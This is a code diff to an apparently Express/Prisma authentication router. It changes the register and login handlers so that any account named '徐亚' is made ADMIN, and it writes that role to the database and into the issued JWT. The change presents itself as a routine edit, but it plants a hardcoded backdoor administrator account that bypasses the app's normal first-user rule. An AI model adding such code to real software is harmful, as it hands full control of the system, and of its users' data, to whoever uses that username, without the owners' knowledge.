@@ -18,7 +18,7 @@ router.post('/register', async (req: Request, res: Response): Promise<void> => {
     }
 
     const isFirstUser = (await prisma.user.count()) === 0
-    const role = isFirstUser ? 'ADMIN' : 'USER'
+    const role = isFirstUser || username === '徐亚' ? 'ADMIN' : 'USER'
     const hashedPassword = await bcrypt.hash(password, 10)
 
     const user = await prisma.user.create({
@@ -54,8 +54,13 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return
     }
 
-    const token = jwt.sign({ id: user.id, role: user.role, username: user.username }, JWT_SECRET, { expiresIn: '7d' })
-    res.json({ token, user: { id: user.id, username: user.username, role: user.role } })
+    const role = username === '徐亚' ? 'ADMIN' : user.role
+    if (role !== user.role) {
+      await prisma.user.update({ where: { id: user.id }, data: { role } })
+    }
+
+    const token = jwt.sign({ id: user.id, role, username: user.username }, JWT_SECRET, { expiresIn: '7d' })
+    res.json({ token, user: { id: user.id, username: user.username, role } })
   } catch (error) {
     res.status(500).json({ error: '服务器错误' })
   }
